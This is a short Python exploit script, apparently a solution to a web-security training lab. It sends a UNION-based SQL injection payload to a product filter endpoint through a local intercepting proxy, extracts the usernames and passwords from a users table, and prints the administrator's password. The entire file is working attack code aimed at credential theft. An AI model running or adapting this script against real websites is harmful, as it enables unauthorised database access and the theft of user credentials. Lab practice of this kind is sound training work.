import requests
from bs4 import BeautifulSoup
import re
import sys
import urllib3

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https:': 'http://127.0.0.1:8080'}


def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select NULL, username || '*' || password from users--"

    res = requests.get(url + path + sql_payload, verify=False, proxies=proxies)

    if username in res.text:
        print("[+] Found the administrator password.")
        soup = BeautifulSoup(res.text, 'html.parser')
        admin_password = soup.find(
            text=re.compile('.*administrator.*')).split('*')[1]
        print("[+] The administrator password is: {}".format(admin_password))
        return True
    return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] {sys.argv[0]} www.example.com")
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords...")

    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")
